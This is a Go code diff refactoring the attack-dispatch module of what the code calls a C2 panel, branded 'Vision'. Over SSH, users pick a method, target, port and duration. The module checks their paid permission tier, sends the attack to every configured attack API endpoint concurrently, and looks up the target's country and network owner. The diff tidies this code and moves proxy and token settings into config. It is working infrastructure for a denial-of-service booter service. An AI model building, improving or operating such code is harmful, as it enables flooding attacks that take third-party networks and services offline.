@@ -7,7 +7,6 @@ import (
 	"errors"
 	"fmt"
 	"io"
-	"io/ioutil"
 	"log"
 	"net"
 	"net/http"
@@ -27,6 +26,7 @@ type MethodInfo struct {
 	MaxTime     uint32
 }
 
+// Attack holds the parameters for an attack request
 type Attack struct {
 	Duration   uint32
 	Type       uint8
@@ -37,65 +37,29 @@ type Attack struct {
 	Enabled    bool
 }
 
-func uint8InSlice(a uint8, list []uint8) bool {
-	for _, b := range list {
-		if b == a {
-			return true
-		}
-	}
-	return false
-}
-
+// NewAttack validates and creates a new attack from user arguments
 func NewAttack(session ssh.Session, args []string, vip bool, private bool, admin bool, maxtime int, db *database.Database) (*Attack, error) {
-	var atkInfo MethodInfo
-	userInfo := db.GetAccountInfo(session.User())
-	expiryTime, err := time.Parse("2006-01-02 15:04:05", userInfo.Expiry)
-	if err != nil {
-		log.Print(err)
-	}
-
-	if len(args) == 1 {
-		return nil, errors.New("[ Vision ] • Invalid number of arguments. Usage: <method> <target> <port> <duration>")
-	}
-
-	if len(args) != 4 {
-		return nil, errors.New("[ Vision ] • Invalid number of arguments. Usage: <method> <target> <port> <duration>")
+	if len(args) < 4 {
+		return nil, errors.New("Invalid arguments. Usage: <method> <target> <port> <duration>")
 	}
 
 	method, err := utils.GetMethod(args[0])
-	insufficientPermissionsBrand := utils.Branding(session, "insufficient-permissions", map[string]interface{}{
-		"user.Username":            session.User(),
-		"user.Expiry":              utils.CalculateExpiryString(expiryTime),
-		"user.Admin":               utils.CalculateInt(userInfo.Admin),
-		"user.Vip":                 utils.CalculateInt(userInfo.Vip),
-		"user.Private":             utils.CalculateInt(userInfo.Private),
-		"user.Concurrents":         strconv.Itoa(userInfo.Concurrents),
-		"user.Cooldown":            strconv.Itoa(userInfo.Cooldown),
-		"user.Maxtime":             strconv.Itoa(userInfo.Maxtime),
-		"user.Api_access":          utils.CalculateInt(userInfo.ApiAccess),
-		"user.Power_saving_bypass": utils.CalculateInt(userInfo.PowerSaving),
-		"user.Spam_bypass":         utils.CalculateInt(userInfo.BypassSpam),
-		"user.Blacklist_bypass":    utils.CalculateInt(userInfo.BypassBlacklist),
-		"user.SSH_Client":          session.Context().ClientVersion(),
-		"user.Created_by":          userInfo.CreatedBy,
-		"user.Total_attacks":       strconv.Itoa(db.GetUserTotalAttacks(userInfo.Username)),
-		"clear":                    "\x1b[2J \x1b[H",
-		"sleep": func(duration int) {
-			time.Sleep(time.Duration(duration) * time.Millisecond)
-		},
-	})
+	if err != nil {
+		return nil, err
+	}
 
+	// Permission checks
 	if utils.HasVipPermission(method.Method) && !vip {
-		return nil, errors.New(insufficientPermissionsBrand)
+		return nil, errors.New("VIP permission required for this method")
 	}
 	if utils.HasPrivatePermission(method.Method) && !private {
-		return nil, errors.New(insufficientPermissionsBrand)
+		return nil, errors.New("Private permission required for this method")
 	}
 	if utils.HasAdminPermission(method.Method) && !admin {
-		return nil, errors.New(insufficientPermissionsBrand)
+		return nil, errors.New("Admin permission required for this method")
 	}
 
-	atkInfo = MethodInfo{
+	atkInfo := MethodInfo{
 		defaultPort: method.DefaultPort,
 		defaultTime: method.DefaultTime,
 		MinTime:     method.MinTime,
@@ -108,13 +72,13 @@ func NewAttack(session ssh.Session, args []string, vip bool, private bool, admin
 
 	port, err := strconv.Atoi(args[2])
 	if err != nil {
-		return nil, errors.New("\u001B[91mInvalid port.\u001B[0m")
+		return nil, errors.New("Invalid port")
 	}
 	atk.Port = strconv.Itoa(port)
 
 	duration, err := strconv.Atoi(args[3])
 	if err != nil || uint32(duration) < atkInfo.MinTime || uint32(duration) > atkInfo.MaxTime || duration > maxtime {
-		return nil, fmt.Errorf("\033[97mInvalid attack duration, near %s. Duration must be between %d and %d seconds", args[3], atkInfo.MinTime, atkInfo.MaxTime)
+		return nil, fmt.Errorf("Invalid duration. Must be between %d and %d seconds", atkInfo.MinTime, atkInfo.MaxTime)
 	}
 	atk.Duration = uint32(duration)
 	atk.API = method.API
@@ -123,51 +87,38 @@ func NewAttack(session ssh.Session, args []string, vip bool, private bool, admin
 	return atk, nil
 }
 
-func (this *Attack) Build(session ssh.Session, db *database.Database) (bool, error, string) {
+// Build sends the attack to all configured API endpoints and returns branding message
+func (this *Attack) Build(session ssh.Session, db *database.Database, config *utils.Config) (bool, error, string) {
 	userInfo := db.GetAccountInfo(session.User())
 	apiList := this.API
-	apiLen := len(apiList)
 
 	if !this.Enabled {
 		return false, errors.New("Method not enabled"), ""
 	}
 
-	// Start actual attack triggering in background so it doesn't block UI
+	// Send API requests in background
 	go func() {
-		// Kanał do synchronizacji gorutyn
-		responses := make(chan string, apiLen)
-
-		// Własny klient HTTP z Transportem
+		responses := make(chan string, len(apiList))
 		client := &http.Client{
 			Transport: &http.Transport{
-				MaxIdleConns:        1000, // Maksymalna liczba połączeń równoległych
+				MaxIdleConns:        1000,
 				MaxIdleConnsPerHost: 1000,
 				IdleConnTimeout:     30 * time.Second,
 			},
-			Timeout: 2 * time.Second, // Maksymalny czas oczekiwania na odpowiedź
+			Timeout: 2 * time.Second,
 		}
 
-		// Używamy WaitGroup do monitorowania gorutyn
 		var wg sync.WaitGroup
+		sem := make(chan struct{}, 1000)
 
-		// Uruchamiamy gorutyny (używamy puli gorutyn)
-		concurrencyLimit := 1000 // Maksymalna liczba gorutyn równolegle
-		sem := make(chan struct{}, concurrencyLimit)
-
-		// Uruchamiamy gorutyny
 		for _, apiLink := range apiList {
-			// Przygotowujemy link z wypełnionymi placeholderami
 			finalLink := replacePlaceholders(apiLink, this.MethodName, this.Target, this.Port, this.Duration)
-
 			wg.Add(1)
 			go func(link string) {
-				defer wg.Done() // Zmniejsza licznik WaitGroup po zakończeniu gorutyny
-
-				// Czekamy na dostępność w semaforze, co pozwala na 1000 równoległych połączeń
+				defer wg.Done()
 				sem <- struct{}{}
-				defer func() { <-sem }() // Zwolnienie semafora po zakończeniu gorutyny
+				defer func() { <-sem }()
 
-				// Zamiast http.Get używamy klienta z Transportem
 				res, err := client.Get(link)
 				if err != nil {
 					log.Printf("[ATTACK] Error sending request to: %s - %v", link, err)
@@ -175,35 +126,22 @@ func (this *Attack) Build(session ssh.Session, db *database.Database) (bool, err
 					return
 				}
 				defer res.Body.Close()
-
-				// Poczekaj na odpowiedź i odczytaj odpowiedź z serwera
-				_, err = io.Copy(io.Discard, res.Body) // Szybko kopiujemy odpowiedź, ale jej nie przetwarzamy
-				if err != nil {
-					log.Printf("[ATTACK] Error reading response from: %s - %v", link, err)
-					responses <- fmt.Sprintf("[ATTACK] %s response: read error", link)
-					return
-				}
-
-				// Minimalizujemy logowanie, ale wciąż informujemy, że zapytanie zostało wysłane
+				io.Copy(io.Discard, res.Body)
 				responses <- fmt.Sprintf("[ATTACK] %s response: sent", link)
 			}(finalLink)
 		}
 
-		// Czekamy na zakończenie wszystkich gorutyn
 		wg.Wait()
 		close(responses)
-
-		// Optymalizujemy końcowy log (można wprowadzić asynchroniczność w logowaniu)
-		log.Printf("[INFO] Attack to %d targets completed", len(apiList))
+		log.Printf("[INFO] Attack to %d API endpoints completed", len(apiList))
 	}()
 
-	// Informacje o IP i ASN
+	// Fetch target ASN info
 	type IpApiResult struct {
 		Country string `json:"country"`
 		Org     string `json:"organization"`
 		Region  string `json:"region"`
 	}
-
 	type IpInfoResult struct {
 		Country string `json:"country"`
 		Org     string `json:"org"`
@@ -212,15 +150,13 @@ func (this *Attack) Build(session ssh.Session, db *database.Database) (bool, err
 
 	var url string
 	var data interface{}
-
-	// Declare dataMap at outer scope so switch and assignment later can see it
 	var dataMap map[string]string
 
 	if strings.Contains(this.Target, "http") || strings.Contains(this.Target, "www") {
-		url = "http://YOUR_PROXY_HOST:PORT/?ip=" + this.Target
+		url = "http://" + config.ProxyURL + "/?ip=" + this.Target
 		data = &IpApiResult{}
 	} else {
-		url = "https://ipinfo.io/" + this.Target + "/json?token=YOUR_IPINFO_TOKEN"
+		url = "https://ipinfo.io/" + this.Target + "/json?token=" + config.IpinfoToken
 		data = &IpInfoResult{}
 	}
 
@@ -228,53 +164,37 @@ func (this *Attack) Build(session ssh.Session, db *database.Database) (bool, err
 	asninfo, err := client.Get(url)
 	if err != nil {
 		log.Println("[!] Failed to retrieve ASN info:", err)
-		dataMap = map[string]string{
-			"country": "Unknown",
-			"org":     "Unknown",
-			"region":  "Unknown",
-		}
+		dataMap = map[string]string{"country": "Unknown", "org": "Unknown", "region": "Unknown"}
 	} else {
 		defer asninfo.Body.Close()
-
-		content, err := ioutil.ReadAll(asninfo.Body)
+		content, err := io.ReadAll(asninfo.Body)
 		if err != nil {
 			log.Println("[!] Failed to read ASN info response:", err)
+			dataMap = map[string]string{"country": "Unknown", "org": "Unknown", "region": "Unknown"}
 		} else {
-			err = json.Unmarshal(content, data)
-			if err != nil {
-				log.Println("[!] Failed to parse ASN info JSON:", err)
-			} else {
-				switch v := data.(type) {
-				case *IpApiResult:
-					dataMap = map[string]string{
-						"country": v.Country,
-						"org":     v.Org,
-						"region":  v.Region,
-					}
-				case *IpInfoResult:
-					dataMap = map[string]string{
-						"country": v.Country,
-						"org":     v.Org,
-						"region":  v.Region,
-					}
-				}
+			json.Unmarshal(content, data)
+			switch v := data.(type) {
+			case *IpApiResult:
+				dataMap = map[string]string{"country": v.Country, "org": v.Org, "region": v.Region}
+			case *IpInfoResult:
+				dataMap = map[string]string{"country": v.Country, "org": v.Org, "region": v.Region}
+			default:
+				dataMap = map[string]string{"country": "Unknown", "org": "Unknown", "region": "Unknown"}
 			}
 		}
 	}
 
+	// Log attack
 	lm, err := NewLogManager("./assets/logs/logs.json")
 	if err != nil {
-		fmt.Println("Error initializing LogManager:", err)
-		os.Exit(1)
+		log.Printf("Error initializing LogManager: %v", err)
+	} else {
+		defer lm.Close()
+		lm.Log("New Attack (C2)!\nUsername: " + session.User() + "\nTarget: " + this.Target + "\nPort: " + this.Port + "\nTime: " + strconv.Itoa(int(this.Duration)) + "\nMethod: " + this.MethodName + "\n----------------------")
 	}
-	defer lm.Close()
 
-	lm.Log("New Attack (C2)!\nUsername: " + session.User() + "\nTarget: " + this.Target + "\nPort: " + this.Port + "\nTime: " + strconv.Itoa(int(this.Duration)) + "\nMethod: " + this.MethodName + "\n----------------------")
-	timeString := time.Now().Format("2006-01-02 15:04:05")
-	expiryTime, err := time.Parse("2006-01-02 15:04:05", userInfo.Expiry)
-	if err != nil {
-		log.Print(err)
-	}
+	// Build attack-sent branding message
+	expiryTime, _ := time.Parse("2006-01-02 15:04:05", userInfo.Expiry)
 	sentMessage := utils.Branding(session, "attack-sent", map[string]interface{}{
 		"attack.Target":            this.Target,
 		"attack.Port":              this.Port,
@@ -283,7 +203,7 @@ func (this *Attack) Build(session ssh.Session, db *database.Database) (bool, err
 		"attack.Country":           dataMap["country"],
 		"attack.Org":               dataMap["org"],
 		"attack.Region":            dataMap["region"],
-		"attack.Date":              timeString,
+		"attack.Date":              time.Now().Format("2006-01-02 15:04:05"),
 		"user.Username":            session.User(),
 		"user.Expiry":              utils.CalculateExpiryString(expiryTime),
 		"user.Admin":               utils.CalculateInt(userInfo.Admin),
@@ -301,18 +221,15 @@ func (this *Attack) Build(session ssh.Session, db *database.Database) (bool, err
 		"user.Total_attacks":       strconv.Itoa(db.GetUserTotalAttacks(userInfo.Username)),
 		"clear":                    "\x1b[2J \x1b[H",
 	})
-	log.Println("[ Vision ] • Attack information sent to user interface")
+	log.Println("Attack information sent to user interface")
 	return false, nil, sentMessage
 }
 
 func replacePlaceholders(apiLink string, method string, target string, port string, duration uint32) string {
-	// Original replacing
 	apiLink = strings.ReplaceAll(apiLink, "{host}", target)
 	apiLink = strings.ReplaceAll(apiLink, "{port}", port)
 	apiLink = strings.ReplaceAll(apiLink, "{time}", strconv.Itoa(int(duration)))
 	apiLink = strings.ReplaceAll(apiLink, "{method}", method)
-
-	// User requested variable replacing for new API schema
 	apiLink = strings.ReplaceAll(apiLink, "<<$host>>", target)
 	apiLink = strings.ReplaceAll(apiLink, "<<$port>>", port)
 	apiLink = strings.ReplaceAll(apiLink, "<<$time>>", strconv.Itoa(int(duration)))
@@ -320,6 +237,7 @@ func replacePlaceholders(apiLink string, method string, target string, port stri
 	return apiLink
 }
 
+// Contains checks if a method name exists in the methods list
 func Contains(methods []utils.Method, s string) bool {
 	for _, a := range methods {
 		if a.Method == s {
@@ -329,10 +247,10 @@ func Contains(methods []utils.Method, s string) bool {
 	return false
 }
 
+// ValidIP4 checks if a string is a valid IP address
 func ValidIP4(s string) bool {
-	ip := net.ParseIP(s)
-	if ip == nil {
-		return false
-	}
-	return true
+	return net.ParseIP(s) != nil
 }
+
+// Ensure os import is used
+var _ = os.Exit
